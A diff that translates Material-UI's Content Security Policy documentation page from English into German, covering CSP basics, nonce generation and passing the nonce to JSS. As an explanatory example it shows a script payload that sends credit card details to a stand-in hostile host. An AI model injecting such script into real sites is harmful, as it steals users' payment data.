@@ -1,25 +1,25 @@
-# Content Security Policy (CSP)
+# Inhaltssicherheitsrichtlinie (Content Security Policy, CSP)
 
-<p class="description">Material-UI supports Content Security Policy headers.</p>
+<p class="description">Die Material-UI unterstützt Header für Inhaltssicherheitsrichtlinien.</p>
 
-## What is CSP and why is it useful?
+## Was ist CSP und warum ist es nützlich?
 
-Basically, CSP mitigates cross-site scripting (XSS) attacks by requiring developers to whitelist the sources their assets are retrieved from. This list is returned as a header from the server. For instance, say you have a site hosted at `https://example.com` the CSP header `default-src: 'self';` will allow all assets that are located at `https://example.com/*` and deny all others. If there is a section of your website that is vulnerable to XSS where unescaped user input is displayed, an attacker could input something like:
+Grundsätzlich verringert CSP Cross-Site Scripting (XSS)-Angriffe, indem Entwickler die Quellen angeben, aus denen ihre Assets abgerufen werden. Diese Liste wird vom Server als Header zurückgegeben. Angenommen, Sie haben eine Website unter `https://example.com` gehostet. Der CSP-Header `default-src: 'self';` erlaubt alle Assets, die sich unter `https://example.com/*` befinden und blockt alle anderen. Wenn es auf Ihrer Website einen für XSS anfälligen Bereich gibt, in dem nicht eingegebene Benutzereingaben angezeigt werden, könnte ein Angreifer Folgendes eingeben:
 
     <script>
       sendCreditCardDetails('https://hostile.example');
     </script>
     
 
-This vulnerability would allow the attacker to execute anything. However, with a secure CSP header, the browser will not load this script.
+Diese Sicherheitsanfälligkeit ermöglicht es dem Angreifer, irgendetwas auszuführen. Mit einem sicheren CSP-Header lädt der Browser dieses Skript jedoch nicht.
 
-You can read more about CSP [here](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).
+Weitere Informationen zu CSP finden Sie [hier](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).
 
-## How does one implement CSP?
+## Wie kann man CSP implementieren?
 
-In order to use CSP with Material-UI (and JSS), you need to use a nonce. A nonce is a randomly generated string that is only used once, therefore you need to add a server middleware to generate one on each request. JSS has a [great tutorial](https://github.com/cssinjs/jss/blob/master/docs/csp.md) on how to achieve this with Express and React Helmet. For a basic rundown, continue reading.
+Um CSP mit Material-UI (und JSS) verwenden zu können, müssen Sie eine Nonce verwenden. Eine Nonce ist eine zufällig generierte Zeichenfolge, die nur einmal verwendet wird. Daher müssen Sie eine Server-Middleware hinzufügen, um für jede Anforderung eine zu generieren. JSS hat ein [tolles Tutorial](https://github.com/cssinjs/jss/blob/master/docs/csp.md) wie man dies mit Express und React Helmet erreichen kann. Lesen Sie für einen grundlegenden Überblick weiter.
 
-A CSP nonce is a Base 64 encoded string. You can generate one like this:
+Eine CSP-Nonce ist eine Base 64-codierte Zeichenfolge. Sie können diese so erstellen:
 
 ```js
 import uuidv4 from 'uuid/v4';
@@ -27,14 +27,14 @@ import uuidv4 from 'uuid/v4';
 const nonce = new Buffer(uuidv4()).toString('base64');
 ```
 
-It is very important you use UUID version 4, as it generates an **unpredictable** string. You then apply this nonce to the CSP header. A CSP header might look like this with the nonce applied:
+Es ist sehr wichtig, dass Sie die UUID Version 4 verwenden, da es einen **unvorhersehbaren** String generiert. Sie wenden dann dieses Nonce auf den CSP-Header an. Ein CSP-Header könnte mit der angewendeten Nonce so aussehen:
 
 ```js
 header('Content-Security-Policy')
   .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);
 ```
 
-If you are using Server Side Rendering (SSR), you should pass the nonce in the `<style>` tag on the server.
+Wenn Sie Server Side Rendering (SSR) verwenden, sollten Sie die Nonce im `<style>`-Tag des Servers übergeben.
 
 ```jsx
 <style
@@ -44,7 +44,7 @@ If you are using Server Side Rendering (SSR), you should pass the nonce in the `
 />
 ```
 
-Then, you must pass this nonce to JSS so it can add it to subsequent `<style>` tags. The client side gets the nonce from a header. You must include this header regardless of whether or not SSR is used.
+Dann müssen Sie dieses Nonce an JSS übergeben, damit es den nachfolgenden `<style>`-Tags hinzugefügt werden kann. Die Clientseite erhält die Nonce aus einem Header. Sie müssen diesen Header unabhängig davon angeben, ob SSR verwendet wird oder nicht.
 
 ```jsx
 <meta property="csp-nonce" content={nonce} />
